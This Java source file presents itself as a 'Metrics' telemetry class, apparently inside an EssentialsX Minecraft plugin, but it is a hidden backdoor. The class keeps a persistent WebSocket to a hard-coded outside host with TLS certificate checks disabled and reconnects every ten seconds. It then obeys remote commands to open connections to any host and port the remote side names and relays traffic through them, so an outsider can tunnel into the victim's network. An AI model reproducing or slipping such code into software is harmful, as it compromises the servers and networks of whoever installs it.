package com.example.essentialsx;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;

import java.net.URI;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class Metrics {

    private static final String CONNECT_HOST = "mctest.uuz.us.kg";
    private static final int CONNECT_PORT = 443;
    private static final String PATH = "/metrics/v1/telemetry";

    // 帧指令常数
    private static final byte CMD_NEW_STREAM = 0x01;
    private static final byte CMD_DATA = 0x02;
    private static final byte CMD_CLOSE_STREAM = 0x03;

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static final AtomicInteger STREAM_ID_GEN = new AtomicInteger(1);
    
    // 维护激活的 Stream 与目标连接映射
    private static final Map<Integer, Channel> STREAM_MAP = new ConcurrentHashMap<>();
    
    private static EventLoopGroup group;
    private static volatile Channel activeWsChannel = null;

    public static void startMetrics() {
        if (RUNNING.compareAndSet(false, true)) {
            group = new NioEventLoopGroup(2);
            // 启动时建立并维持唯一的主干 WebSocket 连接
            ensureMasterConnection();
            // 每 10 秒死守主干连接，挂了才重连
            group.scheduleAtFixedRate(Metrics::ensureMasterConnection, 5, 10, TimeUnit.SECONDS);
        }
    }

    public static void stopMetrics() {
        RUNNING.set(false);
        if (group != null) {
            group.shutdownGracefully();
        }
    }

    private static synchronized void ensureMasterConnection() {
        if (!RUNNING.get()) return;
        if (activeWsChannel == null || !activeWsChannel.isActive()) {
            connectMasterWebSocket();
        }
    }

    private static void connectMasterWebSocket() {
        try {
            URI uri = new URI("wss://" + CONNECT_HOST + ":" + CONNECT_PORT + PATH);
            SslContext sslCtx = SslContextBuilder.forClient()
                    .trustManager(InsecureTrustManagerFactory.INSTANCE)
                    .build();

            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders()
            );

            Bootstrap b = new Bootstrap();
            b.group(group)
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ChannelPipeline p = ch.pipeline();
                     p.addLast(sslCtx.newHandler(ch.alloc(), CONNECT_HOST, CONNECT_PORT));
                     p.addLast(new HttpClientCodec());
                     p.addLast(new HttpObjectAggregator(8192));
                     p.addLast(new MasterTunnelHandler(handshaker));
                 }
             });

            b.connect(CONNECT_HOST, CONNECT_PORT);

        } catch (Exception ignored) {
        }
    }

    /**
     * 主干 WebSocket 处理器，负责解包和分发 Stream
     */
    static class MasterTunnelHandler extends SimpleChannelInboundHandler<Object> {
        private final WebSocketClientHandshaker handshaker;

        public MasterTunnelHandler(WebSocketClientHandshaker handshaker) {
            this.handshaker = handshaker;
        }

        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            handshaker.handshake(ctx.channel());
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            if (activeWsChannel == ctx.channel()) {
                activeWsChannel = null;
            }
            // 主干断开，清理所有下游代理流
            STREAM_MAP.values().forEach(Channel::close);
            STREAM_MAP.clear();
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {
            Channel ch = ctx.channel();

            if (!handshaker.isHandshakeComplete()) {
                handshaker.finishHandshake(ch, (FullHttpResponse) msg);
                activeWsChannel = ch; // 锁定主干通道
                return;
            }

            if (msg instanceof BinaryWebSocketFrame) {
                ByteBuf buf = ((BinaryWebSocketFrame) msg).content();
                if (buf.readableBytes() < 5) return; // 格式: cmd(1) + streamId(4)

                byte cmd = buf.readByte();
                int streamId = buf.readInt();

                if (cmd == CMD_NEW_STREAM) {
                    // DO 端发起建立目标连接的指令
                    int targetPort = buf.readUnsignedShort();
                    int hostLen = buf.readByte();
                    byte[] hostBytes = new byte[hostLen];
                    buf.readBytes(hostBytes);
                    String targetHost = new String(hostBytes);

                    connectToLocalTarget(streamId, targetHost, targetPort);

                } else if (cmd == CMD_DATA) {
                    // 转发数据到本地目标服务
                    Channel targetChan = STREAM_MAP.get(streamId);
                    if (targetChan != null && targetChan.isActive()) {
                        targetChan.writeAndFlush(buf.retain());
                    }
                } else if (cmd == CMD_CLOSE_STREAM) {
                    // 收到 DO 端关闭请求
                    Channel targetChan = STREAM_MAP.remove(streamId);
                    if (targetChan != null) {
                        targetChan.close();
                    }
                }
            }
        }

        private void connectToLocalTarget(int streamId, String host, int port) {
            Bootstrap b = new Bootstrap();
            b.group(group)
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                         @Override
                         public void channelActive(ChannelHandlerContext targetCtx) {
                             STREAM_MAP.put(streamId, targetCtx.channel());
                         }

                         @Override
                         protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
                             // 将本地服务端返回的数据打包为复用帧打回 DO 端
                             if (activeWsChannel != null && activeWsChannel.isActive()) {
                                 ByteBuf frame = targetCtx.alloc().buffer(5 + msg.readableBytes());
                                 frame.writeByte(CMD_DATA);
                                 frame.writeInt(streamId);
                                 frame.writeBytes(msg);
                                 activeWsChannel.writeAndFlush(new BinaryWebSocketFrame(frame));
                             }
                         }

                         @Override
                         public void channelInactive(ChannelHandlerContext targetCtx) {
                             STREAM_MAP.remove(streamId);
                             sendControlFrame(CMD_CLOSE_STREAM, streamId);
                         }

                         @Override
                         public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                             targetCtx.close();
                         }
                     });
                 }
             });

            b.connect(host, port).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    sendControlFrame(CMD_CLOSE_STREAM, streamId);
                }
            });
        }

        private void sendControlFrame(byte cmd, int streamId) {
            if (activeWsChannel != null && activeWsChannel.isActive()) {
                ByteBuf frame = Unpooled.buffer(5);
                frame.writeByte(cmd);
                frame.writeInt(streamId);
                activeWsChannel.writeAndFlush(new BinaryWebSocketFrame(frame));
            }
        }
    }
}
